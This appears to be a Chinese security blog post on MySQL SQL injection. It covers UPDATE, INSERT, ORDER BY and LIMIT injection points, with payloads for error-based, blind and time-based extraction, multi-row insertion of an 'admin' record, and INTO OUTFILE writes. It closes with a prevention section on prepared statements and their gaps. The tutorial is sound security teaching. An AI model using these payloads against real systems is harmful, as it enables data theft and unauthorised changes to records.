Title = "SQL注入"
description = "SQL注入"
tags = ["Web","Security"]
publishtime = 2021-07-27T00:15:00
lastedittime = 2021-08-15T17:03:00
uuid = "5134c576-2e83-4e1e-9b8f-cb6bd63bdc65"
-+_+-

![](https://blog-1301895608.cos.ap-guangzhou.myqcloud.com/img2/20210815133324.png)

# 注入类型



## 概念

- 数字型与字符型注入最大的区别在于，数字型不需要单引号闭合，字符型通常需要闭合单引号。
- WHERE后的括号代表优先级。



![](https://blog-1301895608.cos.ap-guangzhou.myqcloud.com/img2/20210815170304.png)

# 注入位置



## Update注入

```sql
UPDATE TABLE test SET `username`='InjectionPoint' WHERE .....;
```

​	UPDATE是MYSQL中用于更改数据的关键字，一般来说通过报错来完成注入，这程序需要开启错误回显。

```sql
UPDATE TABLE test SET `username`='' or updatexml(2,concat(0x7e,(version())),0) WHERE .....;
```



### ❓如果关闭报错回显呢？

​	利用Mysql非严格模式下，字符串和数组进行或运算得到数字的特性，在关闭了报错的情况下将查询到的数据转换为十进制的数，然后与字符串进行**或运算**，得到的结果就是十进制的数，最终转换为对应的字符串即可。

```sql
UPDATE TABLE test SET `username`='mote'|conv(hex(version()),16,10)|'' WHERE .....;
```

- Mysql中十进制数字范围有限，可以使用`substr()`进行分割

```sql
UPDATE TABLE test SET `username`='mote'|conv(hex(substr(version(),1,5)),16,10)|'' WHERE .....;
```



## Insert注入

一般来说，Insert注入常见地方为文章更新，发表评论等等，这些地方一般使用Insert关键字来修改数据库记录

```sql
INSERT INTO TABELNAME(A,B,C) VALUES($A,$B,$C);
```

假如待插入变量中$A，$B，$C中任意一个变量是攻击者可控的，那么可以改变语句，实现插入多条记录，从而改变变量的上下文限制。

```sql
INSERT INTO TABELNAME(A,B,C) VALUES(A1,B1,C1),(A2,B2,C2);
```

​	例如在程序上下文中`INSERT INTO TABELNAME(A,B,C) VALUES('user',$B,$C);` 已经固定`Column A`的值为 `user`，通过改变`Column C`的值为 `C1),('admin',B2,C2` 即可插入多条记录，并且避开程序对于用户的限制，插入后语句变成了 `INSERT INTO TABELNAME(A,B,C) VALUES('user',B1,C1),('admin',B2,C2);`
​	如果进行多行插入时出现错误，有可能是程序存在隐藏的变量，需要通过响应来判断具体的Column数量来使得语句正确。



## Order By 注入

​	Order By 后可以填字段名或者数字，数字代表第几个字段

```sql
SELECT * FROM demo ORDER BY InjectionPoint;
```

​	利用`asc`和`desc`关键词可以测试是否为`ORDER BY`注入

### 情况一：

```sql
SELECT * FROM demo ORDER BY 2 UNION SELECT user(),database();
```

​	`ORDER BY`一般用来快速判断表中的列数量,`Union`无法跟在`ORDER BY`后面，可以搭配 LIMIT 加上PROCEDURE

### 情况二：order by 盲注（需要知道字段名）

​	IF 语句返回的是字符类型，不是整型，因此不可以直接使用数字替代，需要知道字段名

```sql
SELECT * FROM demo ORDER BY IF(true,id,username);
```

​	可以利用以下两种盲注技巧

- order by rand()

	```sql
	SELECT * FROM demo ORDER BY RAND(true); #当rang()为true和false时，排序结果是不同的，所以就可以使用rang()函数进行盲注
	```

- 时间盲注

	```sql
	SELECT * FROM demo ORDER BY IF(true,1,sleep(1));
	```

	

### 情况三：order by 盲注（不需要知道字段名）
```sql
SELECT * FROM demo ORDER BY IF(true,id,username)
```

- 报错注入

	```sql
	SELECT * FROM demo ORDER BY updatexml(1,if(1=1,1,user()),1);
	```

- 时间盲注
	```sql
	SELECT * FROM demo ORDER BY IF(true,1,sleep(1));
	```

## Limit注入

### 情况一：不使用ORDER BY

```sql
SELECT id FROM users LIMIT InjectionPoint
```
​	这种情况下 `LIMIT`后面可以跟`UNION`进行联合查询注入
```sql
SELECT id FROM users LIMIT 0,1 UNION SELECT USERNAME FROM users;
```

### 情况一：使用ORDER BY

```sql
SELECT field FROM table WHERE id > 0 ORDER BY id LIMIT InjectionPoint
```
- 在使用`ORDER BY`的情况下，`Union`无法跟在`ORDER BY`后面
- 在Mysql 5的语法里`LIMIT`后可以跟`PROCEDURE` 和`INTO`

```sql
SELECT [ALL | DISTINCT | DISTINCTROW ] 
      [HIGH_PRIORITY] 
      [STRAIGHT_JOIN] 
      [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT] 
      [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS] 
    select_expr [, select_expr ...] 
    [FROM table_references 
    [WHERE where_condition] 
    [GROUP BY {col_name | expr | position} 
      [ASC | DESC], ... [WITH ROLLUP]] 
    [HAVING where_condition] 
    [ORDER BY {col_name | expr | position} 
      [ASC | DESC], ...] 
    [LIMIT {[offset,] row_count | row_count OFFSET offset}] 
    [PROCEDURE procedure_name(argument_list)] 
    [INTO OUTFILE 'file_name' export_options 
      | INTO DUMPFILE 'file_name' 
      | INTO var_name [, var_name]] 
    [FOR UPDATE | LOCK IN SHARE MODE]]
```


- PROCEDURE

	MySQL 默认可用的存储过程只有 `ANALYSE`，利用`PROCEDURE`可以利用参数类型不同进行报错注入或者延时注入，延时注入不能用`SLEEP`需要使用`BENCHMARK`

	- 报错注入

	```sql
	SELECT field FROM table WHERE id > 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse(extractvalue(rand(),concat(0x3a,version())),1);
	```

	- 延时注入

	```sql
	SELECT field FROM table WHERE id > 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((SELECT extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)
	```

	

- INTO

	如果要使用`INTO`需要有写权限以及相应的路径

	```sql
	SELECT * FROM test LIMIT 0,1 INTO OUTFILE 'test.txt';
	```

	可以用@来判断列数

	```sql
	SELECT * FROM test LIMIT 0,1 INTO @,@; # ERROR 1222 (21000): The used SELECT statements have a different number of columns
	SELECT * FROM test LIMIT 0,1 INTO @;
	```


# 注入防止



1. 数据库设计规范：
	1. 每个字段取合适的数据类型和数据长度（增加攻击成本）

2. 数据库权限分配：
	1. 严格限制数据库权限（增加攻击成本，减少sql注入的危害）

3. 代码层面：
	1. sql预编译：
	2. 使用过滤器进行sanitizer，转义敏感字符
	3. 捕获sql执行异常，避免异常信息的直接回显，使用不被侧信道的自定义异常
	4. sql执行异常监控并通知
	5. 使用waf

> sql语句传入->检查缓存->规则验证->解析器解析为语法树->预处理器验证语法树->优化sql->生成执行计划->执行

​	❓为什么预编译可以防止Sql注入？

​	程序在执行查询之前，使用占位符?代替字段值的部分，将sql语句交由数据库进行预处理，省却了重复解析和优化相同语法树的时间，提升了SQL执行的效率（构建语法树，优化），并且对应的执行计划也会将sql缓存下来，赋予数据库参数化查询的能力，因此在运行时，可以动态的把参数传给预编译语句，即使参数中有敏感字符，也不会被拼接进语句中当作sql执行，无法再更改语法树的结构，而是当作一个参数或一个字段属性值来处理，不会再出现非预期的查询，这便是预编译能够防止SQL注入的根本原因。

​	❓使用预编译就不会有Sql注入了吗？

​	实际使用过程中仍有一些行为可能导致风险。

  - 开发人员是否正确使用预编译：例如PHP的PDO提供了两种预编译模式：本地预处理和模拟预处理，模拟预处理本质上还是进行sql拼接，只是增加了转义，因此还是有绕过的可能性，本地预处理则是利用数据库的预编译机制来完成
  - 并非所有参数都可以预编译：表名和列名是不能被预编译的。这是由于生成语法树的过程中，预处理器在进一步检查解析后的语法树时，会检查数据表和数据列是否存在，因此数据表和数据列不能被占位符?所替代。但在很多业务场景中，表名需要作为一个变量存在，因此这部分仍需由加号进行SQL语句的拼接，若表名是由外部传入且可控的，仍会造成SQL注入。
  - 同理，ORDER BY后的ASC/DESC也不能被预编译，当业务场景涉及到用户可控制排序方式，且ASC/DESC是由前台传入并拼接到SQL语句上时，就可能出现危险了。
  - like语句比如： like '%whataver%'， like '%%%' 返回所有数据，需要转义%变成 \%





